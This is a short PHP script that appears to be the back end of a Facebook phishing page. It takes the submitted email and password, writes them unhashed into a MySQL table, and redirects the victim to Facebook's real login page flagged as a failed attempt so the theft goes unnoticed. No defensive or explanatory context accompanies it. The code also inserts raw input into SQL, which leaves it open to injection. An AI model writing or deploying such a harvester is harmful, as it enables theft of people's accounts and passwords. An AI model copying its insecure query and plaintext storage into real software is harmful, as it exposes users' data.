<?php 
session_start();
$email = $_POST['email'];
$pass = $_POST['pass'];

$conn = mysqli_connect("localhost","root","","users");

if (!$conn) {
die("Connection failed: " . mysqli_connect_error());
}

$sql = "INSERT INTO usuarios(email,password) VALUES ('$email','$pass')";

$result = mysqli_query($conn, $sql);

mysqli_close($conn);

header("location: https://www.facebook.com/login.php?login_attempt=1&amp;lwv=110 ");
 ?>